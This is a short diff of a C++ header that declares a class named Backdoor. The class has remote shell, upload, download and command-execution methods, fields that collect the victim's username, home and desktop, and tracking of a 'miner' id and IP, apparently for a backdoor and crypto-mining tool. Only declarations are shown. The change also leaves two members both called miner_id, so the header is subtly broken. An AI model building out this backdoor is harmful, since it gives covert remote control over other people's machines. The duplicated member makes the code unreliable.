@@ -14,9 +14,12 @@ public:
     void shell();
     void upload(const char *);
     void download(const char *);
-    std::string get_miner_id();
+    void get_miner_id();
+    void get_miner_info();
+
+    // Gets
     std::string get_miner_ip();
-    std::string get_miner_info();
+    std::string get_id();
     int get_sock();
     Backdoor(int, Communication *, bool, char *);
 
@@ -26,15 +29,16 @@ private:
     void get_username();
     void get_desktop_enviroment();
     char * execute_command(const char *);
-    Communication * c;
+    Communication * c; // Object to send / recv strings
     bool is_server;
-    int sock;
+    int sock; // file descriptor to send / recv strings
     char * client_ip;
     char * miner_id;
     char * user_name;
     char * user_home;
     char * user_desktop;
     char * program_name;
+    std::string miner_id;
 };
 
 #endif
